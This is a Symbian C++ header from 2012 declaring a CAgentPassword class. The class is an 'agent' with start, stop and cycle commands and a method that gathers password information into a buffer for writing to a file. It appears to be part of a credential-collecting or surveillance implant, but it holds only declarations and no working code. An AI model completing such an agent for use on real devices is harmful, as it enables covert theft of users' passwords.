/*
 * AgentPassword.h
 *
 *  Created on: 02/mag/2012
 *      Author: Giovanna
 */

#ifndef AGENTPASSWORD_H_
#define AGENTPASSWORD_H_

#include "AbstractAgent.h"

// CLASS DECLARATION

/**
 *  CAgentPassword
 * 
 */
class CAgentPassword : public CAbstractAgent
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentPassword();

	/**
	 * Two-phased constructor.
	 */
	static CAgentPassword* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentPassword* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
	virtual void CycleAgentCmdL();
		
private:
	
    /**
	 * Constructor for performing 1st stage construction
	 */
	CAgentPassword();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
	/**
	 * Get password information.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	HBufC8*  GetPasswordBufferL();

private:
	
	TBool iBusy;
	
	__FLOG_DECLARATION_MEMBER
	};


#endif /* AGENTPASSWORD_H_ */
